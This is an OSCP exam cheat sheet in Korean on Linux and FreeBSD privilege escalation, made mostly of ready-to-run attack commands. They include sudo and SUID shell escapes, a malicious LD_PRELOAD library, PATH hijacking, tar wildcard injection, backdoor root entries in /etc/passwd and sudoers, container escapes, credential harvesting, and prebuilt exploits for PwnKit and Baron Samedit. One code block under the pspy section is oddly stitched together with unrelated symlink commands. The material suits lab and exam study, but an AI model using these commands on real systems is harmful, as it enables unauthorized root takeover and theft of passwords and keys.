---
title: "Linux 권한 상승 (Linux Privilege Escalation)"
date: 2026-06-20
weight: 70
draft: false
tags: ["oscp", "cheatsheet"]
summary: "낮은 권한에서 root까지 — 시스템 정보, SUID, cron, 서비스, 커널 취약점 순서로 확인."
---

- 출처: https://heretek.dev/oscp-cheatsheet/linux-privilege-escalation/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP

## 빠른 승리 순서 (Quick Win Order) — 시험 압박 속에서 위에서 아래로 읽기

### 30초 확인 — 모든 박스에서 가장 먼저 실행

- `sudo -l` — GTFOBins에 등록된 항목이 하나라도 있으면 즉시 승리 (Check 1)
- `id` — 평범하지 않은 그룹? (docker, lxd, disk, adm, shadow)
- SUID 전수 조사: `find / -perm -4000 -type f 2>/dev/null` (Check 2)
- `ls -la /etc/passwd /etc/shadow` — 원래 있어서는 안 되는 쓰기/읽기 권한?

### 5분 확인 — LinPEAS 시작 전에

- Cron: `cat /etc/crontab`, `ls -la /etc/cron.*` — 쓰기 가능한 스크립트 또는 PATH 남용
- Capabilities: `getcap -r / 2>/dev/null`
- 내부 리스닝 포트: `ss -tulnp`
- 파일 속 creds: `.bash_history`, `.env`, `config.php`, `wp-config.php`

### 15분 확인 — LinPEAS 병렬 실행

- `linpeas.sh` 실행 후 빨강/노랑 하이라이트부터 읽기
- 쓰기 가능한 service unit/설정 파일, PATH 하이재킹
- creds 재사용 — 찾은 패스워드를 root와 다른 유저에 즉시 시도
- `uname -a` → 커널 버전 → searchsploit (더 쉬운 벡터가 없었을 때만)

### 30분 이상 조사 — 시간을 잡아먹는 것들

- 커스텀 SUID 바이너리 → `ltrace`/`strace`로 주입 가능한 `system()`/상대경로 호출 확인
- `sudo -l` env_keep에 나온 LD_PRELOAD / LD_LIBRARY_PATH 남용
- NFS `no_root_squash`, Docker/LXD 그룹 탈출
- 커널 익스플로잇 — 최후 수단, 박스를 크래시시킬 수 있다

### 특수 상황

- 컨테이너 안? `/.dockerenv`, capabilities, 마운트된 호스트 경로 확인
- 제한 쉘(rbash)? `vi`, `python`, `sudo`, 또는 `ssh -t <host> bash` 로 탈출
- 명령이 조용히 실패? 전체 경로를 쓰고 AppArmor/SELinux DENIED 로그 확인

## Check 1 — sudo -l (항상 가장 먼저)

```bash
sudo -l
```

바이너리가 하나라도 나오면 즉시 GTFOBins 확인.

자주 터지는 조합:

```bash
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \; -quit
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo env /bin/sh
sudo less /etc/shadow    # then !sh
sudo nmap --interactive  # then !sh (older nmap)
sudo apt-get changelog apt   # drops to less → type !/bin/sh for root
sudo /usr/bin/tee /etc/passwd < malicious_passwd  # overwrite /etc/passwd
```

- 경고: GTFOBins sudo 익스플로잇이 의외로 실패하면 `grep apparmor /var/log/syslog` 로 DENIED 항목 확인 — AppArmor가 막고 있을 수 있다.

### LD_PRELOAD 하이재킹

`sudo -l`에 `env_keep+=LD_PRELOAD`가 보이면:

```text
// File: /tmp/evil.c
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles
sudo LD_PRELOAD=/tmp/evil.so <allowed_binary>
```

### PYTHONPATH / SETENV 하이재킹

`env_keep+=PYTHONPATH` 또는 `SETENV`가 있으면, sudo 허용 스크립트가 import하는 모듈과 같은 이름의 악성 파이썬 모듈을 만든다.

`sudo -l`에 `gcore`(또는 `/usr/bin/gcore`)가 보이면 권한 있는 프로세스 메모리를 덤프해 평문 creds을 얻는다:

```bash
ps -ef | grep -E 'root|sshd|mysql'   # find a juicy PID
sudo gcore -o /tmp/dump <PID>
strings /tmp/dump.<PID> | grep -iE 'password|passwd|secret|token' | sort -u
```

## Check 2 — SUID 바이너리

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null    # also check SGID
```

결과는 전부 GTFOBins과 대조. 악용 가능한 대표 바이너리: `find`, `vim`, `python`, `bash` (`bash -p`), `nmap`, `cp`, `env`, `gdb`, `systemctl`, `base64`, `openssl`, `wget`.

빠른 SUID 악용 예시:

```bash
# SUID find
find /tmp -exec "/usr/bin/bash" -p \; -quit
# SUID bash/sh
/usr/bin/bash -p          # -p prevents effective UID from being reset
# SUID cp → overwrite /etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'root2:$(openssl passwd w00t):0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd
```

### 커스텀 SUID 바이너리 → PATH 하이재킹

GTFOBins에 없는 SUID 바이너리면 무엇을 호출하는지 조사한다:

```bash
file ./mystery_binary
strings ./mystery_binary | grep -E '^/|system|exec|popen'
```

`strings`에서 슬래시 없는 맨 명령(`chpasswd`, `ping`, `service`, `cat`)이 보이면 그 명령을 `$PATH` 검색으로 호출한다는 뜻. PATH 하이재킹이 통한다.

`strings`가 `echo kiero:kiero | chpasswd`를 보여준 사례 — `chpasswd`가 `/usr/sbin/` 접두사 없이 호출됨.

```bash
# 1. Create fake binary matching the bare name
echo '#!/bin/bash
chmod +s /bin/bash' > /tmp/chpasswd
chmod +x /tmp/chpasswd

# 2. Prepend writable dir to PATH (must come BEFORE /usr/sbin)
export PATH=/tmp:$PATH

# 3. Trigger the SUID binary — it runs YOUR fake as root
./RESET_PASSWD

# 4. /bin/bash now has SUID → root shell
/bin/bash -p
# whoami → root
```

핵심 모델: SUID 바이너리 + 상대경로 명령 + 쓰기 가능 디렉터리 = root.

- SUID 비트가 바이너리를 root로 실행시킨다
- `system()` / `execvp()`는 맨 명령을 `$PATH`에서 찾는다
- `$PATH`를 내가 통제하므로 어떤 바이너리가 먼저 잡히는지도 내가 결정한다

같은 트릭의 변형:

- cron이 맨 명령을 호출 → 같은 PATH 하이재킹 (트리거만 다름)
- 서비스 스크립트가 맨 명령을 호출 → 같은 PATH 하이재킹
- `env_keep += "PATH"` 가 설정된 sudo → sudo 바이너리 경유로 같은 PATH 하이재킹

## Check 3 — Cron 작업과 타이머

```bash
cat /etc/crontab
ls -la /etc/cron.d/ && cat /etc/cron.d/* 2>/dev/null              # READ contents, not just list
ls -la /etc/cron.{daily,hourly,weekly,monthly}/
cat /etc/cron.{daily,hourly,weekly,monthly}/* 2>/dev/null         # READ all periodic scripts
crontab -l
sudo crontab -l              # root's crontab (if sudo allows)
systemctl list-timers --all

# Check cron logs for RUNNING jobs (shows what's actually executing)
grep "CRON" /var/log/syslog 2>/dev/null
grep "CRON" /var/log/cron.log 2>/dev/null
```

숨은 root cron을 잡으려면 pspy64 실행:

```bash
chmod +x pspy64 && ./pspy64
# Watch for UID=0 commands running periodically
cp * /media

cd /var/www/target-site/uploads

echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh

chmod +x runme.sh

touch -- '--checkpoint=1'

touch -- '--checkpoint-action=exec=sh runme.sh'

ln -s /root/.ssh/id_rsa rootkey

ln -s /etc/shadow shadowcopy

ln -s /root/proof.txt rootproof
```

root로 도는 cron을 찾았을 때 확인 목록:

- 쓰기 가능한 스크립트? → 내용을 리버스 쉘로 교체
- 쓰기 가능한 디렉터리에서 `*` 사용? → 와일드카드 인젝션 (아래)
- 절대경로 없이 명령 호출? → PATH 하이재킹
- 파이썬 모듈 import? → 라이브러리 하이재킹
- bash 파일 source? → 소스 파일 하이재킹
- 하드코딩된 creds? → creds 재사용

### RED FLAGS — `cat /etc/cron.d/*` 후 5초 스캔

훑지 말고 모든 줄을 읽는다. 아래 중 하나라도 보이면 멈추고 악용한다:

- 줄 끝이 맨 `*` → 와일드카드 인젝션 (중요). 예: `cd /opt/admin && tar -zxf backup.tar.gz *`
- `/opt/`, `/home/`, `/tmp/`, `/var/www/` 아래 경로 → 쓰기 가능 여부 확인. 예: `cd /opt/admin && ...` → `ls -la /opt/admin`
- `tar` / `rsync` / `chown` / `7z` / `zip` / `find` + 경로 → 와일드카드 인젝션 (중요). 위 명령어 + `*` 조합이면 된다
- 맨 명령(`/usr/bin/` 접두사 없음) → PATH 하이재킹 (중요). 예: `* * * * * root cleanup.sh`
- `.sh` 스크립트 → 스크립트와 부모 디렉터리 양쪽의 쓰기 가능 확인. 예: `bash /opt/scripts/x.sh`
- `python` / `perl` / `php` 스크립트 → 모듈/라이브러리 하이재킹 확인. 예: `python /opt/app/main.py`

root cron/스크립트가 쓰기 가능한 디렉터리에서 `tar`, `rsync`, `chown`, `7z` 등을 `*`와 함께 실행한다면:

```bash
# tar — files starting with `--` are interpreted as flags
cd /writable_dir
echo 'cp /bin/bash /tmp/rb && chmod +s /tmp/rb' > x.sh
chmod +x x.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh x.sh'
# Cron triggers `tar czf backup.tar.gz *` → /tmp/rb -p = root

# rsync — --rsh injection
touch -- '-e sh x.sh'

# 7z — leaks file contents to stderr
touch -- '@x.txt' && ln -s /etc/shadow x.txt
# `7z a backup.7z *` → /etc/shadow content leaked
```

- 핵심 모델: `*`로 확장된 파일명을 플래그로 파싱하는 바이너리는 전부 취약. 악성 플래그를 "이름"으로 갖는 파일을 떨어뜨린다.

## Check 4 — Capabilities

```bash
getcap -r / 2>/dev/null
```

출력 읽는 법: `/usr/bin/perl = cap_setuid+ep`

- `=` 왼쪽 → 바이너리 이름 (GTFOBins의 Capabilities 섹션에서 검색)
- `=` 와 `+` 사이 → capability (부여된 권한)
- 플래그에 `e`(effective)가 포함되어야 악용 가능 — `+ep` 또는 `+eip`는 살아있고, `+i`만이면 휴면 상태라 건너뛴다

인터프리터에 `cap_setuid+ep`가 있으면 즉시 root:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'
```

capability별 영향:

- `cap_setuid+ep` — 인터프리터로 root 전환 (위 명령)
- `cap_dac_read_search+ep` — 임의 파일 읽기 (`/etc/shadow`, `/root/.ssh/id_rsa` 포함)
- `cap_dac_override+ep` — 임의 파일 읽고 쓰기 (`/etc/passwd`, `/etc/sudoers` 교체)
- `cap_chown+ep` — 임의 파일 소유권 변경 → /etc/passwd 장악
- `cap_sys_admin+ep` — 파일시스템 마운트 (디스크 마운트, chroot 탈출)
- `cap_net_raw+ep` — raw 소켓 (네트워크 스니핑, ARP)
- `cap_sys_ptrace+ep` — 임의 프로세스 인젝션 (root 프로세스 탈취)
- `cap_sys_module+ep` — 커널 모듈 로드

## Check 5 — 자동 열거 (LinPEAS 등)

```bash
./linpeas.sh | tee linpeas_output.txt
```

RED/YELLOW 발견은 거의 확실한 privesc 벡터다.

대체 도구 (linpeas가 AV에 막히거나 없을 때):

```bash
unix-privesc-check standard > output.txt   # pre-installed on Kali, transfer to target
# Also: LinEnum.sh, linux-exploit-suggester.sh
```

linpeas가 놓칠 수 있는 수동 확인:

```bash
# World-writable directories (check for cron scripts, service binaries in these)
find / -writable -type d 2>/dev/null
```

## Check 6 — 패스워드 헌팅

### 환경 변수와 dotfile (가장 먼저 — 비용 가장 낮음)

```bash
# Env vars may contain hardcoded creds set by admins
env | grep -i 'pass\|cred\|secret\|key\|token'

# .bashrc can export credentials as env vars
cat ~/.bashrc | grep -i 'export\|pass\|cred\|secret'
cat /home/*/.bashrc 2>/dev/null | grep -i 'export\|pass'
```

### 실행 중인 프로세스에서 creds 스니핑

```bash
# Watch for transient processes leaking passwords in command-line args
watch -n 1 "ps aux | grep pass"
# Example catch: sshpass -p 'Password123' ssh user@127.0.0.1
# pspy is better for this — but watch works without transferring tools
```

### grep 기반 creds 검색

```bash
grep -ri 'password' /var/www/ /etc/ /opt/ /home/ 2>/dev/null
grep -ri 'passwd\|credential\|secret\|api.key\|token' /var/www/ /opt/ 2>/dev/null
cat ~/.bash_history
cat /home/*/.bash_history
cat /root/.bash_history 2>/dev/null
```

### 노이즈 감소 (기본 검색이 너무 많이 나올 때)

위 grep은 소방호스다. `/etc/`나 `/var/www/`가 수천 건으로 범람하면(locales, manpage, doc string, 패키지 메타데이터) 대신 이것들:

```bash
# 1. Filenames only first — triage, then read selectively
grep -rli 'password' /etc/ /var/www/ /opt/ 2>/dev/null

# 2. Tighten the regex — '=' or ':' kills doc/help-text noise
grep -rEi 'password\s*[:=]' /etc/ /var/www/ /opt/ 2>/dev/null

# 3. Scope by file type — drops binaries, locales, manpages
grep -rEi --include='*.php' --include='*.py' --include='*.sh' \
  --include='*.conf' --include='*.ini' --include='*.env' \
  --include='*.yml' --include='*.yaml' --include='*.xml' --include='*.js' \
  'password\s*[:=]' / 2>/dev/null

# 4. Strip known-noise paths from existing results
grep -ri 'password' /etc/ 2>/dev/null | grep -vE '/locale/|/man/|\.gz:'

# 5. Volume check before diving in
grep -ri 'password' /etc/ 2>/dev/null | wc -l   # >500? tighten the query
```

우선순위: 파일명만 (#1) → 정규식 강화 (#2) → 확장자 범위 (#3) → 상위 결과 읽기.

### Git 저장소 (삭제된 creds은 커밋 히스토리에 남는다)

```bash
# Find .git directories
find / -name ".git" -type d 2>/dev/null

# Inside a git repo: check for removed secrets
cd /path/to/repo
git log                                    # list commits
git show <COMMIT_HASH>                     # diff of that commit — shows added/removed lines
git log -p                                 # all diffs in full
git log --all --oneline                    # compact view
```

자주 cred이 나오는 위치:

```bash
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /var/www/html/.env
find / -name "*.config" -o -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" 2>/dev/null
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
```

### 보호된 파일 크랙

패스워드로 보호된 파일을 찾으면 크랙한다. 누군가 보호했다면 내용이 중요하다는 뜻.

```bash
# The *2john family converts any format to john-crackable hash
pdf2john file.pdf > hash.txt
zip2john file.zip > hash.txt
keepass2john file.kdbx > hash.txt
ssh2john id_rsa > hash.txt
rar2john file.rar > hash.txt
office2john file.docx > hash.txt

# Then crack
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Check 7 — SSH 키

```bash
find / -name id_rsa -o -name id_dsa -o -name id_ecdsa -o -name id_ed25519 -o -name "*.pem" 2>/dev/null
cat /home/*/.ssh/authorized_keys 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null
```

## Check 8 — 쓰기 가능한 /etc/passwd, /etc/shadow, /etc/sudoers

```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/
```

/etc/passwd 쓰기 가능:

```bash
openssl passwd -1 password123
echo 'hacker:$1$xyz$abc...:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker    # password: password123
```

/etc/sudoers 또는 /etc/sudoers.d/ 쓰기 가능 (실전에서는 passwd보다 흔함):

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo -i   # root
# Or drop a new file in sudoers.d/
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/zz_pwn
```

/etc/shadow 쓰기 가능:

```bash
# Replace root's hash with a known one
openssl passwd -6 toor   # → $6$...
# Edit /etc/shadow, replace root's $6$... with yours, then `su root` with toor
```

## Check 9 — 내부 서비스

```bash
ss -tulnp
netstat -tulnp 2>/dev/null
```

`127.0.0.1`에 바인딩된 서비스를 찾는다 — 외부 nmap에는 안 보인다.

자주 나오는 것: MySQL 3306 (`mysql -u root` 시도), Redis 6379, 고 포트의 내부 웹 앱, dev 서버.

악용을 위해 포트 포워딩:

```bash
# Basic: forward target localhost:8080 to YOUR localhost:8080
ssh -L 8080:127.0.0.1:8080 user@target -N

# With SSH key + non-standard port (common in labs)
ssh -i id_ecdsa user@target -p 2222 -L 8080:127.0.0.1:8080 -N

# Forward multiple ports at once
ssh -i id_key user@target -p PORT -L 8080:127.0.0.1:8080 -L 3306:127.0.0.1:3306 -N

# -N = no shell, just forward the port
# -L = local forward (target localhost -> your localhost)
# Then browse http://127.0.0.1:8080 on Kali to access the service
```

터졌을 때 정석 대응 (한 줄 기억용):

- Redis (6379) → `CONFIG SET dir /root/.ssh/` + `dbfilename authorized_keys` + `SET x "ssh-rsa..."` + `SAVE`
- MySQL root + 쓰기 가능 웹루트 → `SELECT '<?php ... ?>' INTO OUTFILE '/var/www/html/x.php'`
- Docker socket 읽기 가능 → `/` 를 마운트하고 chroot (docker 그룹과 같은 페이로드, Check 11)
- Werkzeug/Flask debug → 파이썬 REPL 그 자체: `__import__('os').system('id')`
- 그 외 → 그 서비스 설정을 박스에서 검색 (`/etc/<svc>/*`) — creds이 보통 거기 있다

## Check 10 — NFS no_root_squash

```bash
# External (from Kali, during initial enum) — port 2049 in nmap = NFS
showmount -e <target_ip>

# Internal (post-foothold)
cat /etc/exports
# Look for: /share *(rw,no_root_squash)
```

발견하면:

```bash
# On attacker (as root):
sudo mount -t nfs $ip:/share /tmp/nfs
sudo cp /bin/bash /tmp/nfs/bash
sudo chmod +s /tmp/nfs/bash
# On target:
/share/bash -p
```

## Check 11 — 권한 그룹 (Docker / LXD / disk / adm / shadow)

```bash
id
# Look for: docker, lxd, lxc, disk, adm, shadow, kvm, sudo, wheel, video
```

그룹별 root 경로:

- `docker` — `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
- `lxd` / `lxc` — 아래 LXD 블록 참조
- `adm` — `/var/log/*` 읽기 (auth.log, syslog가 sudo/sshpass creds을 새는 경우가 많다)
- `shadow` — `/etc/shadow` 읽기 → `unshadow` + john으로 오프라인 크랙
- `video` — 프레임버퍼 `/dev/fb0` 읽기 — 활성 GUI 세션이 있을 때만 유용
- `kvm` — `/dev/kvm` 접근 — 디스크 이미지 마운트와 조합
- `sudo` / `wheel` — `sudo -l` (Check 1에서 이미 커버)

Docker 탈출:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

LXD 탈출:

```bash
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

disk 그룹 — 블록 디바이스 raw 읽기 (debugfs):

```bash
# debugfs gives raw filesystem read on the block device
debugfs /dev/sda1
debugfs:  cat /etc/shadow
debugfs:  dump /root/.ssh/id_rsa /tmp/rootkey
debugfs:  quit
chmod 600 /tmp/rootkey && ssh -i /tmp/rootkey root@127.0.0.1
```

목록에 없는 그룹 분류:

```bash
getent group <name>          # who else is in it, hints at purpose
find / -group <name> -ls 2>/dev/null | head -20   # what files it owns
```

`/etc/`의 설정, `/usr/sbin/`의 바이너리, `/var/log/`의 로그, `/dev/`의 디바이스를 본다. 15분 동안 쓸 게 없으면 버린다 — privesc 벡터가 아니다.

## Check 12a — 유저영역 SUID/sudo CVE (초반에 시도해도 안전)

커널이 아니라 SUID 바이너리나 sudo를 악용하므로 박스를 크래시시키지 않는다. 커널 익스플로잇보다 먼저 시도.

```bash
# PwnKit (CVE-2021-4034) — pkexec SUID, ~Ubuntu/Debian/CentOS 2014–early 2022
ls -la /usr/bin/pkexec                # confirm SUID present
# Prebuilt: https://github.com/ly4k/PwnKit
./pwnkit                              # → root shell

# Baron Samedit (CVE-2021-3156) — sudo < 1.9.5p2
sudo --version                        # check
# Prebuilt: https://github.com/blasty/CVE-2021-3156
./sudo-baron-samedit                  # → root shell

# Sudoedit -e (CVE-2023-22809) — sudo 1.8.0–1.9.12p1
# Trigger when sudo -l shows sudoedit (or sudo -e) on a specific file
EDITOR='vim -- /etc/sudoers' sudoedit /allowed/file
# Edits ANY file as root via the appended path. Also works with vi/nano/ed.

# Looney Tunables (CVE-2023-4911) — glibc 2.34+ (Ubuntu 22.04+, RHEL 9, Fedora 37+)
# Prebuilt: https://github.com/leesh3288/CVE-2023-4911
./looney                              # less common on OSCP labs, more on modern infra
```

- 팁: Kali에서 `searchsploit pwnkit` / `searchsploit CVE-2021-3156` 로 빠르게 확인. 프리빌드 POC는 컴파일 없이 대부분의 OSCP 세대 타깃에서 동작한다.

## Check 12b — 커널 익스플로잇 (최후 수단)

```bash
uname -a
cat /etc/issue
cat /etc/os-release
# Then on Kali: searchsploit "linux kernel <version> Local Privilege Escalation"
```

uname 출력 읽는 법: `5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 ... 2020 x86_64`

- `5.4.0-42-generic` → 업스트림 커널 + 배포판 패치 레벨 (`-42`) + 플레이버
- `#46-Ubuntu ... Fri Jul 10 2020` → 빌드 날짜가 기준선: 이 날짜 이후 공개된 CVE만 적용 가능 (중요)
- `x86_64` → 아키텍처 (컴파일한 익스플로잇이 맞아야 한다)

`/etc/os-release`(배포판 + 릴리스)와 조합해 전체 식별자를 만든다.

조회 쿼리 템플릿: `<distro> <release> <kernel> privilege escalation`
예: `ubuntu 20.04 5.4.0-42 privilege escalation`

linux-exploit-suggester.sh 사용:

```bash
./linux-exploit-suggester.sh              # reads uname automatically
./linux-exploit-suggester.sh -k 5.4.0-42  # force a specific kernel string
```

CVE 목록이 아니라 Exposure 태그를 읽는다:

- `highly probable` / `probable` → 시도
- `less probable` / `unprobable` → 건너뜀

컴파일 전 교차 확인: `<CVE> <distro> <release> patched` 로 검색 — 타깃 빌드 날짜에 패치가 배포되지 않았음을 확인.

linux-exploit-suggester.sh 의 주요 커널 익스플로잇:

- DirtyPipe (CVE-2022-0847) — Linux 5.8 – 5.16.11, 5.15.25, 5.10.102
- DirtyCow (CVE-2016-5195) — 구형 커널 (< 4.8.3)
- OverlayFS (CVE-2021-3493 / CVE-2023-0386) — Ubuntu 전용

- 경고: 커널 익스플로잇은 박스를 크래시시킬 수 있다. Check 12a를 먼저 다 쓴다.

## Checks 13-18 — 추가 벡터

```bash
# 13. World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# 14. Script analysis — apply the 13-item checklist to every script found

# 15. Python library hijacking
python3 -c "import sys; print('\n'.join(sys.path))"
# Writable directory in sys.path + root runs Python script = hijack

# 16. PATH hijacking
echo $PATH
# sudo with env_keep+=PATH or SETENV + script uses relative command

# 17. Writable systemd services
find /etc/systemd /lib/systemd /run/systemd -name "*.service" -writable 2>/dev/null
# Exploit (see Writable systemd Service block below)

# 18. Process monitoring
ps aux | grep -i 'pass\|user\|cred'
# pspy is better for catching transient processes

# 19. /etc/ld.so.preload writable — instant root on next SUID call
ls -la /etc/ld.so.preload
# If writable: drop a malicious .so path → loaded into every binary including SUID
gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles
echo "/tmp/evil.so" > /etc/ld.so.preload
sudo /usr/bin/find . -exec /bin/bash -p \;   # any SUID/sudo call triggers it
```

쓰기 가능한 systemd 서비스 악용:

```bash
# Find any writable .service file root manages
find /etc/systemd /lib/systemd -name "*.service" -writable 2>/dev/null

# Edit ExecStart to drop a SUID bash:
# [Service]
# ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb && chmod +s /tmp/rb'

# Reload + trigger (need ANY way to make root reload — sudo systemctl, sudo reboot, scheduled restart):
sudo systemctl daemon-reload && sudo systemctl restart <svc>
# OR if sudo allows reboot:
sudo reboot

# After the service reloads as root, the copied bash is SUID:
/tmp/rb -p   # root
```

## 자동 도구가 아무것도 못 찾을 때

LinPEAS, sudo -l, SUID, cron이 전부 비었을 때:

1. 파일시스템 루트에서 비기본 디렉터리 확인 — `ls /` 로 `/opt/`, `/srv/`, `/backup/`, 커스텀 디렉터리 등 평범하지 않은 것을 찾는다. 거기 일부러 놓인 것에는 이유가 있다.
2. 접근 가능한 모든 파일 읽기 — 홈 디렉터리, 웹 루트, 설정 파일이 특히. 패스워드 보호 파일은 고가치 (크랙한다).
3. 내부 서비스 확인 — `ss -tulnp` 로 localhost 전용 서비스. 외부 스캔에 안 보이고 root로 도는 경우가 많다.
4. 실행 중인 프로세스 확인 — `ps aux` 로 root가 도는 흥미로운 인자의 서비스. 일시적 프로세스는 `pspy64` 로 잡는다.
5. 새 맥락으로 재열거 — 유저명, 패스워드, 서비스명 등 새 정보를 찾을 때마다 표적 검색 재실행.

privesc은 익스플로잇보다 정보 기반이라면: 파일 발견 → 크랙 → 읽기 → 숨은 서비스 발견 → 사용. 자동 도구는 설정 오류를 찾지, 정보 수집은 하지 않는다.

## FreeBSD 권한 상승

FreeBSD는 sudo 대신 doas를 쓴다. 설정은 /usr/local/etc/doas.conf.

### 인식

- `uname -a` 에 FreeBSD 표시
- 서드파티 설정 디렉터리는 /etc/ 가 아니라 /usr/local/etc/
- 서비스 관리는 `service NAME onestart/onestop/restart`
- 패키지 매니저는 apt 대신 pkg
- 섀도 파일은 /etc/shadow 대신 /etc/master.passwd

### 열거

```bash
cat /usr/local/etc/doas.conf
id
ls /usr/local/etc/rc.d/
find /usr/local/etc/ -writable 2>/dev/null
```

### 악용: doas service 남용

doas.conf에 `permit nopass USER cmd service args X onestart` 형태가 있으면:

1. 서비스 바이너리 / 설정 / Include 디렉터리의 쓰기 가능 확인
2. 서비스 설정이 쓰기 가능한 디렉터리의 파일을 include하는지 확인 (메인 conf에서 Include grep)
3. 웹 서비스면 DocumentRoot에 웹셸을 두고 doas로 서비스 시작 → 서비스 유저로 쉘 수신

실전 사례: Apache는 root가 아닌 www 유저로 실행됐고 httpd.conf와 Includes 디렉터리는 읽기 전용이었다. 진짜 가치는 post-exploit looting에서 FILES 공유를 가리키는 sshpass 명령이 .history에서 발견된 것.

교훈: doas 남용으로 깔끔한 privesc이 안 나오면, 가치는 다음 머신 피벗 creds을 위한 열거에 있다. .history, .bash_history, /home/*/.ssh, /var/mail, /tmp, /var/log 을 뒤진다.

### FreeBSD Post-Exploit Looting

```bash
cat /root/.history /root/.bash_history
ls /var/mail/ && cat /var/mail/*
cat /etc/master.passwd
find /home /usr/home -name .ssh 2>/dev/null
find / -name '*.sh' -o -name '*.py' 2>/dev/null | xargs grep -l password 2>/dev/null
```
